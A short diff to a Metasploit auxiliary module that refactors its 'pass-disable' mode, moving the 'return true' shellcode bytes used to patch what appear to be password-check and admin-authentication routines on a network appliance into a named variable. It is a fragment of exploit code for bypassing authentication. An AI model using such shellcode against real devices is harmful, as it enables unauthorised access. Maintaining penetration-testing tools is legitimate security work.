@@ -88,8 +88,9 @@ class MetasploitModule < Msf::Auxiliary
 
   def build_shellcode(asa_vers, mode)
       if mode == 'pass-disable'
-          pmcheck_bytes = "49.192.64.195" # return true code
-          admauth_bytes = "49.192.64.195"
+          always_return_true = "49.192.64.195"
+          pmcheck_bytes = always_return_true
+          admauth_bytes = always_return_true
       else
           pmcheck_bytes = @shellcode[asa_vers][5]
           admauth_bytes = @shellcode[asa_vers][8]
